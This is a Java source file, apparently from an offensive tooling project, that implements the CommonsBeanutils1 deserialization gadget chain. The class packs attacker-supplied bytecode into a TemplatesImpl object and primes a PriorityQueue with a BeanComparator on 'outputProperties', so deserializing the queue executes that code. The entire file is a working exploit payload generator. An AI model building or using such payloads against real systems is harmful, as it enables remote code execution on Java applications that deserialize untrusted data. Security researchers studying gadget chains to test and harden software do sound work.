package com.threed.payloads;

import com.threed.utils.utils;
import org.apache.commons.beanutils.BeanComparator;

import java.io.ByteArrayOutputStream;
import java.io.ObjectOutputStream;
import java.util.PriorityQueue;
import java.util.Queue;

public class CommonsBeanutils1 implements ObjectPayload<Queue>{


    @Override
    public Queue<Object> getObject(byte[] classBytes) throws Exception {

        Object obj = utils.createTemplatesImpl(classBytes);

        final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);
        final PriorityQueue<Object> queue = new PriorityQueue<Object>(2, comparator);
        // stub data for replacement later
        queue.add("1");
        queue.add("1");

        utils.setFieldValue(comparator, "property", "outputProperties");
        utils.setFieldValue(queue, "queue", new Object[]{obj, obj});

        return queue;
    }


}
